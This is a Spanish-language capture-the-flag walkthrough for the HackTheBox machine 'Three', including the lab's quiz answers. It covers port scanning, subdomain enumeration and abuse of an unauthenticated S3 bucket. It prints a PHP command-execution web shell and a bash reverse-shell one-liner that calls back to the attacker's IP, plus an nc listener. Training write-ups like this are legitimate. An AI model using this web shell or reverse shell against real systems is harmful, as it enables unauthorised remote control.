1)¿Cuántos puertos TCP hay abiertos?
	2

2)¿Cuál es el dominio de la dirección de correo electrónico facilitada en la sección «Contacto» del sitio web?
	thetoppers.htb

3)En ausencia de un servidor DNS, ¿qué archivo de Linux podemos utilizar para resolver nombres de host en direcciones IP con el fin de poder acceder a los sitios web que apuntan a esos nombres de host?
	/etc/hosts

4)¿Qué subdominio se descubre durante la enumeración posterior?
	s3.thetoppers.htb
	[[aws]]
	
5)¿Qué servicio se ejecuta en el subdominio descubierto?
	amazon s3

6)¿Qué utilidad de línea de comandos puede utilizarse para interactuar con el servicio que se ejecuta en el subdominio descubierto?
	awscli
	Pero el comando para usar en consola es aws

7)¿Qué comando se utiliza para configurar la instalación de la CLI de AWS?
	aws configure

8)¿Cuál es el comando utilizado por la utilidad anterior para listar todos los buckets de S3?
	aws s3 ls
	
9)¿Este servidor está configurado para ejecutar archivos escritos en qué lenguaje de scripting web?
	php

-------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.227.248
nmap -p- --open -vvv --min-rate 5000 -sS -n -Pn 10.129.227.248 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.129.227.248 -oN target
```

![[Three1.png]]

![[Three2.png]]

Sabemos que es una maquina linux por el ttl cercano a 64, y que el puerto 22 esta abierto con un servicio ssh y el 80 con un apache

------
# [[Whatweb-wappalyzer]]
![[Three3.png]]
El script de nmap no conectaba y el whatweb nos da el mail con dominio thetoppers.htb que lo vamos a agregar a etc/hosts para probar

------

# Agregar dominio a /etc/hosts

```
10.129.227.248 thetoppers.htb
```

![[Three4.png]]

--------

# Enumeracion de subdominios con [[Gobuster]]
Tuvimos que usar el gobuster, por que en el ffuf no salia nada y al ver el writeup, vemos que con gobuster si encontraba el subdominio, pero como sale con codigo de estado 404, no nos aparece en ffuf

```shell
gobuster vhost -u http://thetoppers.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

![[Three5.png]]
Como resultado tenemos s3.thetoppers.htb

-----
# Agregar dominio a /etc/hosts

```
10.129.182.45 s3.thetoppers.htb
```

![[Three6.png]]

Ahora entramos a la pagina `http://s3.thetoppers.htb/` y ya nos va a cargar
![[Three13.png]]

-------
# Intrusion a la maquina con [[aws]]

Vamos a acceder a los contenedores de amazon s3, y ver sus contenidos para enumerar un poco, podemos ver que estos son los archivos de la pagina principal, asi que vamos a cargar posteriormente un archivo que nos permita ejecutar comandos

```shell
aws --endpoint-url http://s3.thetoppers.htb s3 ls --no-sign-request
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb --no-sign-request
```

![[Three7.png]]
Con el primer comando al ver que nos responde thetoppers.htb sabemos que esta hosteando la pagina victima, asi que vamos a intentar cargar y/o modificar archivos
Con el segundo comando visualizamos el contenido del directorio



Vamos a descargar el archivo index para ver si nos da alguna pista:
```shell
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb/index.php --no-sign-request
```

![[Three10.png]]
El contenido del archivo index no nos dio ningun dato util
#### Cargamos el archivo [[archivo php inyección comandos]]

Contenido del archivo exploit.php
```
<?php system($_GET["cmd"]); ?>
```

Ahora con este comando de [[aws]] vamos a cargar el archivo exploit.php
```
aws --endpoint-url=http://s3.thetoppers.htb s3 cp exploit.php s3://thetoppers.htb --no-sign-request
```

![[Three8.png]]

Desde la maquina victima, vamos a hacer una prueba para ver si funciona el archivo que cargamos

http://thetoppers.htb/exploit.php?cmd=id
![[Three9.png]]
Como podemos ver nos muestra nos responde, asi que el archivo cumple su funcion correctamente



-------
## Enviamos la [[Reverse shell]] mientras estamos en escucha con [[nc -nlvp 443]] en nuestra maquina

##### Desde la maquina victima:

```
http://thetoppers.htv/exploit.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.16/443 0>%261'
```

![[Three11.png]]

##### Desde la maquina atacante:

```
nc -nlvp 443
```
![[Three12.png]]
Una vez dentro de la maquina cateamos la flag

----------
# Creditos
Writeup oficial HackTheBox